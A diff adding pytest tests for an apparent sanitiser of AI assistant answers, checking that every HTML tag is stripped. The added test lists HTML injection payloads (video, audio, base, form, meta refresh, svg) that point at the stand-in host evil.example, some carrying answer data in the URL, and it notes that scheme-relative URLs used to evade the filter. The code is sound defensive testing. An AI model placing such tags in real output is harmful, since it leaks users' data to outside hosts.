@@ -126,6 +126,33 @@ def test_guard_leaves_an_exclamation_before_a_citation_alone():
     assert cleaned == answer and removed == []
 
 
+@pytest.mark.parametrize("html", [
+    "<video poster=//evil.example/v.png?q=leave></video>",
+    "<audio src=//evil.example/a.mp3 autoplay>",
+    "<video><source src=//evil.example/s.webm></video>",
+    "<svg><image href=//evil.example/i.png /></svg>",
+    "<input type=image src=//evil.example/b.png>",
+    "<base href=//evil.example/>",
+    "<form action=//evil.example/f><button>Go</button></form>",
+    '<meta http-equiv=refresh content="0;url=//evil.example/">',
+    "<table background=//evil.example/t.png><tr><td>18</td></tr></table>",
+])
+def test_guard_removes_every_html_tag_not_only_img_and_a(html):
+    # A scheme relative URL slips past the bare URL pass, so these tags used to come through whole and a
+    # renderer that allows HTML fetched, or posted to, evil.example. No tag survives, whatever its name.
+    cleaned, removed = guard_answer(f"Leave is 18 days. {html}", allowed_domains=["harbourline.example"])
+    assert "<" not in cleaned and "evil.example" not in cleaned
+    assert cleaned.startswith("Leave is 18 days.")
+    assert removed
+
+
+def test_guard_leaves_comparisons_and_autolinks_to_the_other_passes():
+    # Only something a browser would parse as a tag goes: a letter right after "<".
+    answer = "Claims under SGD 50 < SGD 100 > none are approved. Mail <hr@harbourline.example>."
+    cleaned, removed = guard_answer(answer, allowed_domains=["harbourline.example"])
+    assert cleaned == answer and removed == []
+
+
 def test_spotlight_boundary_is_random_and_wraps_every_passage():
     a, ba = spotlight(["one", "two"])
     b, bb = spotlight(["one", "two"])
